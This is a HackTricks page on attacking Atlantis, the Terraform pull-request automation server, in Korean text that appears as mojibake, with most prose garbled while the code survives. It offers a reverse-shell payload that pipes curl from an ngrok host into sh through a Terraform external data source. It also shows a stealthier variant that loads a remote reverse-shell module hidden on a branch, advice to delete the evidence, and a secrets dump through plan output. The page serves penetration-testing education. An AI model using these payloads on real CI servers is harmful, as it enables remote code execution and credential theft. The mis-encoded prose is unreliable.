# ì•„í‹€ë€í‹°ìŠ¤ ë³´ì•ˆ

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ì—ì„œ **ì œë¡œ**ë¶€í„° **íˆì–´ë¡œ**ê¹Œì§€ AWS í•´í‚¹ì„ ë°°ìš°ì„¸ìš”!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

- **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸¸ ì›í•˜ê±°ë‚˜** **PDFë¡œ HackTricks ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
- [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
- **ğŸ’¬ [ë””ìŠ¤ì½”ë“œ ê·¸ë£¹](https://discord.gg/hRep4RUj7f)** ë˜ëŠ” [í…”ë ˆê·¸ë¨ ê·¸ë£¹](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
- **í•´í‚¹ ìš”ë ¹ì„ ê³µìœ **í•˜ë ¤ë©´ [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œë¡œ PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>

## ê¸°ë³¸ ì •ë³´

ì•„í‹€ë€í‹°ìŠ¤ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ ê¹ƒ ì„œë²„ì—ì„œ í’€ ë¦¬í€˜ìŠ¤íŠ¸ë¥¼ í†µí•´ í…Œë¼í¼ì„ ì‹¤í–‰í•˜ëŠ” ë° ë„ì›€ì„ ì¤ë‹ˆë‹¤.

![](<../.gitbook/assets/image (161).png>)

## ë¡œì»¬ ë©

1. [https://github.com/runatlantis/atlantis/releases](https://github.com/runatlantis/atlantis/releases)ì˜ **ì•„í‹€ë€í‹°ìŠ¤ ë¦´ë¦¬ìŠ¤ í˜ì´ì§€**ë¡œ ì´ë™í•˜ì—¬ **ì í•©í•œ ê²ƒì„ ë‹¤ìš´ë¡œë“œ**í•©ë‹ˆë‹¤.
2. **ê¹ƒí—ˆë¸Œ** ì‚¬ìš©ìì˜ **repo ì•¡ì„¸ìŠ¤**ë¥¼ ìœ„í•œ **ê°œì¸ í† í°**(repo ì•¡ì„¸ìŠ¤ì™€ í•¨ê»˜)ì„ ìƒì„±í•©ë‹ˆë‹¤.
3. `./atlantis testdrive`ë¥¼ ì‹¤í–‰í•˜ë©´ **ì•„í‹€ë€í‹°ìŠ¤ì™€ í†µì‹ í•  ìˆ˜ ìˆëŠ” ë°ëª¨ ë ˆí¬**ê°€ ìƒì„±ë©ë‹ˆë‹¤.
4. 127.0.0.1:4141ì—ì„œ ì›¹ í˜ì´ì§€ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## ì•„í‹€ë€í‹°ìŠ¤ ì•¡ì„¸ìŠ¤

### ê¹ƒ ì„œë²„ ìê²© ì¦ëª…

**ì•„í‹€ë€í‹°ìŠ¤**ëŠ” **ê¹ƒí—ˆë¸Œ**, **ê¹ƒë©**, **ë¹„íŠ¸ë²„í‚·** ë° **Azure DevOps**ì™€ ê°™ì€ ì—¬ëŸ¬ git í˜¸ìŠ¤íŠ¸ë¥¼ ì§€ì›í•©ë‹ˆë‹¤.\
ê·¸ëŸ¬ë‚˜ ì´ëŸ¬í•œ í”Œë«í¼ì˜ ë¦¬í¬ì§€í† ë¦¬ì— ì•¡ì„¸ìŠ¤í•˜ê³  ì‘ì—…ì„ ìˆ˜í–‰í•˜ë ¤ë©´ ì¼ë¶€ **íŠ¹ê¶Œ ì•¡ì„¸ìŠ¤ ê¶Œí•œì´ ë¶€ì—¬**ë˜ì–´ì•¼ í•©ë‹ˆë‹¤(ì“°ê¸° ê¶Œí•œ ì´ìƒ).\
[**ë¬¸ì„œ**](https://www.runatlantis.io/docs/access-credentials.html#create-an-atlantis-user-optional)ëŠ” íŠ¹íˆ ì•„í‹€ë€í‹°ìŠ¤ë¥¼ ìœ„í•´ ì´ëŸ¬í•œ í”Œë«í¼ì— ì‚¬ìš©ìë¥¼ ìƒì„±í•˜ë„ë¡ ê¶Œì¥í•˜ì§€ë§Œ ì¼ë¶€ ì‚¬ëŒë“¤ì€ ê°œì¸ ê³„ì •ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% hint style="warning" %}
ê³µê²©ìì˜ ê´€ì ì—ì„œ **ì•„í‹€ë€í‹°ìŠ¤ ê³„ì •**ì€ ë§¤ìš° **í¥ë¯¸ë¡œìš´ ëŒ€ìƒ**ì´ ë  ê²ƒì…ë‹ˆë‹¤.
{% endhint %}

### ì›¹í›…

ì•„í‹€ë€í‹°ìŠ¤ëŠ” ì„ íƒì ìœ¼ë¡œ [**ì›¹í›… ë¹„ë°€**](https://www.runatlantis.io/docs/webhook-secrets.html#generating-a-webhook-secret)ì„ ì‚¬ìš©í•˜ì—¬ **ê¹ƒ í˜¸ìŠ¤íŠ¸**ë¡œë¶€í„° ë°›ì€ **ì›¹í›…**ì´ **ì •ë‹¹í•œì§€ í™•ì¸**í•©ë‹ˆë‹¤.

ì´ë¥¼ í™•ì¸í•˜ëŠ” í•œ ê°€ì§€ ë°©ë²•ì€ **ê¹ƒ í˜¸ìŠ¤íŠ¸ì˜ IPì—ì„œë§Œ ìš”ì²­ì„ í—ˆìš©**í•˜ë„ë¡í•˜ëŠ” ê²ƒì´ì§€ë§Œ, ë” ì‰¬ìš´ ë°©ë²•ì€ ì›¹í›… ë¹„ë°€ì„ ì‚¬ìš©í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.

ê°œì¸ github ë˜ëŠ” bitbucket ì„œë²„ë¥¼ ì‚¬ìš©í•˜ì§€ ì•ŠëŠ” í•œ ì›¹í›… ì—”ë“œí¬ì¸íŠ¸ë¥¼ ì¸í„°ë„·ì— ë…¸ì¶œí•´ì•¼ í•©ë‹ˆë‹¤.

{% hint style="warning" %}
ì•„í‹€ë€í‹°ìŠ¤ëŠ” **ì›¹í›…ì„ ë…¸ì¶œ**í•˜ì—¬ git ì„œë²„ê°€ ì •ë³´ë¥¼ ë³´ë‚¼ ìˆ˜ ìˆë„ë¡ í•©ë‹ˆë‹¤. ê³µê²©ìì˜ ê´€ì ì—ì„œëŠ” **ë©”ì‹œì§€ë¥¼ ë³´ë‚¼ ìˆ˜ ìˆëŠ”ì§€** ì•Œ ìˆ˜ ìˆëŠ” ê²ƒì´ í¥ë¯¸ë¡œìš¸ ê²ƒì…ë‹ˆë‹¤.
{% endhint %}

### ì œê³µì ìê²© ì¦ëª… <a href="#provider-credentials" id="provider-credentials"></a>

[ë¬¸ì„œì—ì„œ:](https://www.runatlantis.io/docs/provider-credentials.html)

ì•„í‹€ë€í‹°ìŠ¤ëŠ” **ì„œë²„**ì—ì„œ **Terraformì„ ì‹¤í–‰**í•˜ê¸° ìœ„í•´ ë‹¨ìˆœíˆ **`terraform plan` ë° `apply`** ëª…ë ¹ì„ ì‹¤í–‰í•©ë‹ˆë‹¤. ë¡œì»¬ì—ì„œ Terraformì„ ì‹¤í–‰í•  ë•Œì™€ ë§ˆì°¬ê°€ì§€ë¡œ AtlantisëŠ” íŠ¹ì • ì œê³µìì— ëŒ€í•œ ìê²© ì¦ëª…ì´ í•„ìš”í•©ë‹ˆë‹¤.

íŠ¹ì • ì œê³µìì— ëŒ€í•œ ìê²© ì¦ëª…ì„ Atlantisì— ì œê³µí•˜ëŠ” ë°©ë²•ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

- Atlantis [Helm Chart](https://www.runatlantis.io/docs/deployment.html#kubernetes-helm-chart) ë° [AWS Fargate Module](https://www.runatlantis.io/docs/deployment.html#aws-fargate)ì—ëŠ” ì œê³µì ìê²© ì¦ëª…ì„ ìœ„í•œ ê³ ìœ í•œ ë©”ì»¤ë‹ˆì¦˜ì´ ìˆìŠµë‹ˆë‹¤. í•´ë‹¹ ë¬¸ì„œë¥¼ ì°¸ì¡°í•˜ì„¸ìš”.
- í´ë¼ìš°ë“œì—ì„œ Atlantisë¥¼ ì‹¤í–‰í•˜ëŠ” ê²½ìš° ë§ì€ í´ë¼ìš°ë“œì—ì„œ í´ë¼ìš°ë“œ API ì•¡ì„¸ìŠ¤ë¥¼ ì œê³µí•˜ëŠ” ë°©ë²•ì´ ìˆìŠµë‹ˆë‹¤. ì˜ˆ:
  - [AWS EC2 Roles](https://registry.terraform.io/providers/hashicorp/aws/latest/docs) ("EC2 Role" ê²€ìƒ‰)
  - [GCE Instance Service Accounts](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider\_reference)
- ë§ì€ ì‚¬ìš©ìê°€ Atlantisê°€ ì‹¤í–‰ë˜ëŠ” ìœ„ì¹˜ì—ì„œ í™˜ê²½ ë³€ìˆ˜ë¥¼ ì„¤ì •í•©ë‹ˆë‹¤. ì˜ˆ: `AWS_ACCESS_KEY`
- ë‹¤ë¥¸ ì‚¬ëŒë“¤ì€ Atlantisê°€ ì‹¤í–‰ë˜ëŠ” ìœ„ì¹˜ì— í•„ìš”í•œ êµ¬ì„± íŒŒì¼ì„ ìƒì„±í•©ë‹ˆë‹¤. ì˜ˆ: `~/.aws/credentials`
- ì œê³µì ìê²© ì¦ëª…ì„ ì–»ê¸° ìœ„í•´ [HashiCorp Vault Provider](https://registry.terraform.io/providers/hashicorp/vault/latest/docs)ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤.

{% hint style="warning" %}
**Atlantis**ê°€ **ì‹¤í–‰**ë˜ëŠ” **ì»¨í…Œì´ë„ˆ**ì—ëŠ” Terraformì„ í†µí•´ Atlantisê°€ ê´€ë¦¬í•˜ëŠ” ì œê³µì(AWS, GCP, Github...)ì— ëŒ€í•œ **íŠ¹ê¶Œ ìê²© ì¦ëª…**ì´ í¬í•¨ë˜ì–´ ìˆì„ ê°€ëŠ¥ì„±ì´ ë§¤ìš° ë†’ìŠµë‹ˆë‹¤.
{% endhint %}

### ì›¹ í˜ì´ì§€

ê¸°ë³¸ì ìœ¼ë¡œ AtlantisëŠ” ë¡œì»¬í˜¸ìŠ¤íŠ¸ì˜ í¬íŠ¸ 4141ì—ì„œ **ì›¹ í˜ì´ì§€ë¥¼ ì‹¤í–‰**í•©ë‹ˆë‹¤. ì´ í˜ì´ì§€ëŠ” ë‹¨ìˆœíˆ atlantis applyë¥¼ í™œì„±í™”/ë¹„í™œì„±í™”í•˜ê³  ë¦¬í¬ì˜ ê³„íš ìƒíƒœë¥¼ í™•ì¸í•˜ê³  ì ê¸ˆì„ í•´ì œí•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤(ë”°ë¼ì„œ ìˆ˜ì •í•  ìˆ˜ ì—†ìœ¼ë¯€ë¡œ ê·¸ë‹¤ì§€ ìœ ìš©í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤).

ì¸í„°ë„·ì— ë…¸ì¶œë˜ì–´ ìˆì§€ ì•Šì„ ê°€ëŠ¥ì„±ì´ ë†’ì§€ë§Œ, ê¸°ë³¸ì ìœ¼ë¡œ ì•¡ì„¸ìŠ¤í•  ë•Œ **ìê²© ì¦ëª…ì´ í•„ìš”í•˜ì§€ ì•Šì€ ê²ƒìœ¼ë¡œ ë³´ì…ë‹ˆë‹¤**(í•„ìš”í•œ ê²½ìš° `atlantis`:`atlantis`ê°€ **ê¸°ë³¸**ì…ë‹ˆë‹¤).

## ì„œë²„ êµ¬ì„±

`atlantis server`ì˜ êµ¬ì„±ì€ ëª…ë ¹ì¤„ í”Œë˜ê·¸, í™˜ê²½ ë³€ìˆ˜, êµ¬ì„± íŒŒì¼ ë˜ëŠ” ì„¸ ê°€ì§€ì˜ í˜¼í•©ì„ í†µí•´ ì§€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

- Atlantis ì„œë²„ì—ì„œ ì§€ì›í•˜ëŠ” [**í”Œë˜ê·¸ ëª©ë¡ì€ ì—¬ê¸°ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**](https://www.runatlantis.io/docs/server-configuration.html#server-configuration)
- [**ì—¬ê¸°ì—ì„œ êµ¬ì„± ì˜µì…˜ì„ í™˜ê²½ ë³€ìˆ˜ë¡œ ë³€í™˜í•˜ëŠ” ë°©ë²•**](https://www.runatlantis.io/docs/server-configuration.html#environment-variables)ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ê°’ì€ ë‹¤ìŒê³¼ ê°™ì€ ìˆœì„œë¡œ ì„ íƒë©ë‹ˆë‹¤:

1. í”Œë˜ê·¸
2. í™˜ê²½ ë³€ìˆ˜
3. êµ¬ì„± íŒŒì¼

{% hint style="warning" %}
êµ¬ì„±ì—ì„œ **í† í° ë° ë¹„ë°€ë²ˆí˜¸**ì™€ ê°™ì€ í¥ë¯¸ë¡œìš´ ê°’ì´ í¬í•¨ë  ìˆ˜ ìˆìŒì— ìœ ì˜í•˜ì„¸ìš”.
{% endhint %}

### ë¦¬í¬ êµ¬ì„±

ì¼ë¶€ êµ¬ì„±ì€ **ë¦¬í¬ì§€í† ë¦¬ê°€ ê´€ë¦¬ë˜ëŠ” ë°©ì‹**ì— ì˜í–¥ì„ ì¤ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ **ê° ë¦¬í¬ì§€í† ë¦¬ê°€ ë‹¤ë¥¸ ì„¤ì •ì„ ìš”êµ¬**í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ ê° ë¦¬í¬ì§€í† ë¦¬ë¥¼ ì§€ì •í•˜ëŠ” ë°©ë²•ì´ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” ìš°ì„  ìˆœìœ„ ìˆœì„œì…ë‹ˆë‹¤:

1. ë¦¬í¬ [**`/atlantis.yml`**](https://www.runatlantis.io/docs/repo-level-atlantis-yaml.html#repo-level-atlantis-yaml-config) íŒŒì¼. ì´ íŒŒì¼ì€ ë¦¬í¬ì§€í† ë¦¬ë¥¼ ì–´ë–»ê²Œ ì²˜ë¦¬í• ì§€ ì§€ì •í•˜ëŠ” ë° ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ê¸°ë³¸ì ìœ¼ë¡œ ì¼ë¶€ í‚¤ëŠ” í”Œë˜ê·¸ë¥¼ í†µí•´ í—ˆìš©í•˜ì§€ ì•Šìœ¼ë©´ ì—¬ê¸°ì—ì„œ ì§€ì •í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤.
2. `allowed_overrides` ë˜ëŠ” `allow_custom_workflows`ì™€ ê°™ì€ í”Œë˜ê·¸ì— ì˜í•´ í—ˆìš©ë˜ì–´ì•¼ í•  ê°€ëŠ¥ì„±ì´ ë†’ìŠµë‹ˆë‹¤.
3. [**ì„œë²„ ì¸¡ êµ¬ì„±**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config): `--repo-config` í”Œë˜ê·¸ë¡œ ì „ë‹¬í•  ìˆ˜ ìˆìœ¼ë©°, ê° ë¦¬í¬ì§€í† ë¦¬ì— ëŒ€í•œ ìƒˆë¡œìš´ ì„¤ì •ì„ êµ¬ì„±í•˜ëŠ” yamlì…ë‹ˆë‹¤(ì •ê·œì‹ ì§€ì›).
4. **ê¸°ë³¸** ê°’ë“¤
#### PR Protections

AtlantisëŠ” **PR**ì´ **`approved`**ë˜ê¸°ë¥¼ ì›í•˜ëŠ”ì§€ (ë¸Œëœì¹˜ ë³´í˜¸ì— ì„¤ì •ë˜ì§€ ì•Šì•˜ë”ë¼ë„) ë°/ë˜ëŠ” **`mergeable`**í•˜ê²Œ (ë¸Œëœì¹˜ ë³´í˜¸ê°€ í†µê³¼ëœ í›„) **applyë¥¼ ì‹¤í–‰í•˜ê¸° ì „ì—**í•˜ëŠ”ì§€ë¥¼ ì§€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë³´ì•ˆì ì¸ ì¸¡ë©´ì—ì„œ ë‘ ì˜µì…˜ì„ ì„¤ì •í•˜ëŠ” ê²ƒì´ ê¶Œì¥ë©ë‹ˆë‹¤.

`allowed_overrides`ê°€ Trueì¸ ê²½ìš°, ì´ëŸ¬í•œ ì„¤ì •ì€ **ê° í”„ë¡œì íŠ¸ì—ì„œ `/atlantis.yml` íŒŒì¼ë¡œ ë®ì–´ì“¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.**

#### Scripts

ë¦¬í¬ì§€í† ë¦¬ êµ¬ì„±ì€ **ì›Œí¬í”Œë¡œìš°ê°€ ì‹¤í–‰ë˜ê¸° ì „**[**(pre workflow hooks)**](https://www.runatlantis.io/docs/pre-workflow-hooks.html#usage)ì™€ **í›„**[**(post workflow hooks)**](https://www.runatlantis.io/docs/post-workflow-hooks.html)ì— **ì‹¤í–‰í•  ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì§€ì •**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë¦¬í¬ì§€í† ë¦¬ `/atlantis.yml` íŒŒì¼ì—ì„œ **ì´ëŸ¬í•œ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì§€ì •í•˜ëŠ” ì˜µì…˜ì´ ì—†ìŠµë‹ˆë‹¤.**

#### Workflow

ë¦¬í¬ì§€í† ë¦¬ êµ¬ì„±(ì„œë²„ ì¸¡ êµ¬ì„±)ì—ì„œëŠ” [**ìƒˆë¡œìš´ ê¸°ë³¸ ì›Œí¬í”Œë¡œìš°ë¥¼ ì§€ì •**](https://www.runatlantis.io/docs/server-side-repo-config.html#change-the-default-atlantis-workflow)í•˜ê±°ë‚˜ [**ìƒˆë¡œìš´ ì‚¬ìš©ì ì •ì˜ ì›Œí¬í”Œë¡œìš°ë¥¼ ìƒì„±**](https://www.runatlantis.io/docs/custom-workflows.html#custom-workflows)**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.** ë˜í•œ ìƒì„±ëœ **ìƒˆë¡œìš´ ê²ƒì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆëŠ” ë¦¬í¬ì§€í† ë¦¬**ë¥¼ **ì§€ì •**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ê·¸ëŸ° ë‹¤ìŒ, ê° ë¦¬í¬ì§€í† ë¦¬ì˜ **atlantis.yaml** íŒŒì¼ì—ì„œ ì‚¬ìš©í•  ì›Œí¬í”Œë¡œìš°ë¥¼ **ì§€ì •**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% hint style="danger" %}
[**ì„œë²„ ì¸¡ êµ¬ì„±**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) í”Œë˜ê·¸ `allow_custom_workflows`ê°€ **True**ë¡œ ì„¤ì •ëœ ê²½ìš°, ê° ë¦¬í¬ì§€í† ë¦¬ì˜ **`atlantis.yaml`** íŒŒì¼ì—ì„œ ì›Œí¬í”Œë¡œìš°ë¥¼ **ì§€ì •**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ **`allowed_overrides`**ê°€ ì‚¬ìš©ë˜ì–´ì•¼ í•  ìˆ˜ë„ ìˆìœ¼ë©°, ì‚¬ìš©í•  ì›Œí¬í”Œë¡œìš°ë¥¼ **ë®ì–´ì“°ê¸°**í•˜ê¸° ìœ„í•´ **`workflow`**ë„ ì§€ì •í•´ì•¼ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ì´ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ í•´ë‹¹ ë¦¬í¬ì§€í† ë¦¬ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆëŠ” ëª¨ë“  ì‚¬ìš©ìì—ê²Œ **Atlantis ì„œë²„ì—ì„œ RCEë¥¼ ì œê³µ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

#### Conftest ì •ì±… í™•ì¸

AtlantisëŠ” **ì„œë²„ ì¸¡** [**conftest**](https://www.conftest.dev/) **ì •ì±…**ì„ ê³„íš ì¶œë ¥ì— ëŒ€í•´ ì‹¤í–‰í•˜ëŠ” ê²ƒì„ ì§€ì›í•©ë‹ˆë‹¤. ì´ ë‹¨ê³„ë¥¼ ì‚¬ìš©í•˜ëŠ” ì¼ë°˜ì ì¸ ì‚¬ë¡€ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

* ëª¨ë“ˆ ëª©ë¡ ì‚¬ìš© ê±°ë¶€
* ìƒì„± ì‹œ ë¦¬ì†ŒìŠ¤ì˜ ì†ì„± ë‹¨ì–¸
* ì˜ë„í•˜ì§€ ì•Šì€ ë¦¬ì†ŒìŠ¤ ì‚­ì œ ê°ì§€
* ë³´ì•ˆ ìœ„í—˜ ë°©ì§€ (ì˜ˆ: ì•ˆì „í•œ í¬íŠ¸ë¥¼ ê³µê°œí•˜ëŠ” ê²ƒ)

êµ¬ì„± ë°©ë²•ì€ [**ë¬¸ì„œ**](https://www.runatlantis.io/docs/policy-checking.html#how-it-works)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## Atlantis ëª…ë ¹ì–´

[**ë¬¸ì„œ**](https://www.runatlantis.io/docs/using-atlantis.html#using-atlantis)ì—ì„œ Atlantisë¥¼ ì‹¤í–‰í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ì˜µì…˜ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
# Get help
atlantis help

# Run terraform plan
atlantis plan [options] -- [terraform plan flags]
##Options:
## -d directory
## -p project
## --verbose
## You can also add extra terraform options

# Run terraform apply
atlantis apply [options] -- [terraform apply flags]
##Options:
## -d directory
## -p project
## -w workspace
## --auto-merge-disabled
## --verbose
## You can also add extra terraform options
```
## ê³µê²©

{% hint style="warning" %}
ë§Œì•½ ê³µê²© ì¤‘ì— ë‹¤ìŒ **ì—ëŸ¬**ë¥¼ ë°œê²¬í•œë‹¤ë©´: `Error: Error acquiring the state lock`

ë‹¤ìŒì„ ì‹¤í–‰í•˜ì—¬ í•´ê²°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
atlantis unlock #You might need to run this in a different PR
atlantis plan -- -lock=false
```
{% endhint %}

### Atlantis plan RCE - ìƒˆ PRì—ì„œ êµ¬ì„± ìˆ˜ì •

ë§Œì•½ ê·€í•˜ê°€ ì €ì¥ì†Œì— ì“°ê¸° ì•¡ì„¸ìŠ¤ ê¶Œí•œì´ ìˆë‹¤ë©´ í•´ë‹¹ ì €ì¥ì†Œì— ìƒˆ ë¸Œëœì¹˜ë¥¼ ìƒì„±í•˜ê³  PRì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **`atlantis plan`ì„ ì‹¤í–‰í•  ìˆ˜ ìˆë‹¤ë©´(ë˜ëŠ” ìë™ìœ¼ë¡œ ì‹¤í–‰ë˜ëŠ” ê²½ìš°)** Atlantis ì„œë²„ ë‚´ì—ì„œ RCEë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ë¥¼ ìˆ˜í–‰í•˜ëŠ” ë°©ë²•ì€ [**Atlantisê°€ ì™¸ë¶€ ë°ì´í„° ì†ŒìŠ¤ë¥¼ ë¡œë“œí•˜ë„ë¡ í•˜ëŠ” ê²ƒ**](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source)ì…ë‹ˆë‹¤. `main.tf` íŒŒì¼ì— ë‹¤ìŒê³¼ ê°™ì€ payloadë¥¼ ë„£ìœ¼ë©´ ë©ë‹ˆë‹¤:
```json
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### ì€ë°€í•œ ê³µê²©

ì´ ê³µê²©ì„ **ë” ì€ë°€í•˜ê²Œ** ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ìŒ ì œì•ˆì„ ë”°ë¥´ì„¸ìš”:

* í…Œë¼í¼ íŒŒì¼ì— ì§ì ‘ rev ì‰˜ì„ ì¶”ê°€í•˜ëŠ” ëŒ€ì‹ , rev ì‰˜ì„ í¬í•¨í•˜ëŠ” **ì™¸ë¶€ ë¦¬ì†ŒìŠ¤ë¥¼ ë¡œë“œ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
rev shell ì½”ë“œëŠ” [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

* ì™¸ë¶€ ìì›ì—ì„œëŠ” **ref** ê¸°ëŠ¥ì„ ì‚¬ìš©í•˜ì—¬ **ë ˆí¬ì§€í† ë¦¬ ë‚´ì˜ ë¸Œëœì¹˜ì— terraform rev shell ì½”ë“œë¥¼ ìˆ¨ê¸°ì„¸ìš”**, ë‹¤ìŒê³¼ ê°™ì´: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`
* Atlantisë¥¼ íŠ¸ë¦¬ê±°í•˜ê¸° ìœ„í•´ **masterì— PRì„ ìƒì„±í•˜ëŠ” ëŒ€ì‹ **, **2ê°œì˜ ë¸Œëœì¹˜(test1 ë° test2)ë¥¼ ìƒì„±**í•˜ê³  **í•œ ë¸Œëœì¹˜ì—ì„œ ë‹¤ë¥¸ ë¸Œëœì¹˜ë¡œ PRì„ ìƒì„±**í•˜ì„¸ìš”. ê³µê²©ì„ ì™„ë£Œí•˜ë©´ **PRê³¼ ë¸Œëœì¹˜ë¥¼ ì œê±°**í•˜ì„¸ìš”.

### Atlantis plan Secrets Dump

`atlantis plan` (`terraform plan`)ì„ ì‹¤í–‰í•˜ì—¬ **terraformì—ì„œ ì‚¬ìš©ëœ ë¹„ë°€ ì •ë³´ë¥¼ ë¤í”„**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ terraform íŒŒì¼ì— ë‹¤ìŒê³¼ ê°™ì€ ë‚´ìš©ì„ ë„£ìœ¼ì„¸ìš”:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
### Atlantis RCE ì ìš© - ìƒˆ PRì—ì„œ êµ¬ì„± ìˆ˜ì •

ë§Œì•½ ê·€í•˜ê°€ ì €ì¥ì†Œì— ì“°ê¸° ì•¡ì„¸ìŠ¤ ê¶Œí•œì´ ìˆë‹¤ë©´ í•´ë‹¹ ì €ì¥ì†Œì— ìƒˆ ë¸Œëœì¹˜ë¥¼ ìƒì„±í•˜ê³  PRì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **`atlantis apply`ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆë‹¤ë©´ Atlantis ì„œë²„ ë‚´ì—ì„œ RCEë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

ê·¸ëŸ¬ë‚˜ ì¼ë°˜ì ìœ¼ë¡œ ì¼ë¶€ ë³´í˜¸ ê¸°ëŠ¥ì„ ìš°íšŒí•´ì•¼ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

- **ë³‘í•© ê°€ëŠ¥**: Atlantisì— ì´ ë³´í˜¸ ê¸°ëŠ¥ì´ ì„¤ì •ë˜ì–´ ìˆëŠ” ê²½ìš°, **PRì´ ë³‘í•© ê°€ëŠ¥í•œ ê²½ìš°ì—ë§Œ `atlantis apply`ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤** (ì¦‰, ë¸Œëœì¹˜ ë³´í˜¸ë¥¼ ìš°íšŒí•´ì•¼ í•©ë‹ˆë‹¤).
- [**ë¸Œëœì¹˜ ë³´í˜¸ ìš°íšŒ**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md)ë¥¼ í™•ì¸í•˜ì„¸ìš”.
- **ìŠ¹ì¸ë¨**: Atlantisì— ì´ ë³´í˜¸ ê¸°ëŠ¥ì´ ì„¤ì •ë˜ì–´ ìˆëŠ” ê²½ìš°, **ë‹¤ë¥¸ ì‚¬ìš©ìê°€ PRì„ ìŠ¹ì¸í•´ì•¼ë§Œ `atlantis apply`ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.
